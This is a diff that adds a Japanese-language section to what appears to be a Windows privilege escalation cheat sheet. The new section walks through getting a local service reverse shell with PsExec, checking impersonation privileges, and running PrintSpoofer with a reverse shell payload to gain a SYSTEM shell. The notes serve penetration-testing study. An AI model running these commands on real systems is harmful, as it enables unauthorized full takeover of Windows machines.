@@ -2089,6 +2089,22 @@ Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのフ�
 攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合 - Juicy Potato を試してみてください。
 ```
 ### Token Impersonation - PrintSpoofer
+まずは、netcatでlistenしておき管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
+PSEexec64.exeを使用してlocal serviceアカウントを獲得する。
+```
+PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
+```
+上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
+この時、いずれかの権限を持っている場合にRouge Potatoのエクスプロイトが機能する。
+- SeImpersonatePrivilege
+- SeAssignPrimaryTokenPrivilege
+ここまでの流れとして、先ほどのRogue Potatoと同じ条件となる。  
+
+最後にlocal serviceのreverse shellが返ってきているシェルでPrintSpooferエクスプロイトを実行して、SYTEM権限のシェルを獲得する。
+```
+PrintSpoofer.exe -c "C:\Windows\Temp\reverse.exe(reverse shellペイロードが配置されているパス)" -i
+```
+
 ### Privilege Escalation Scripts
 
 
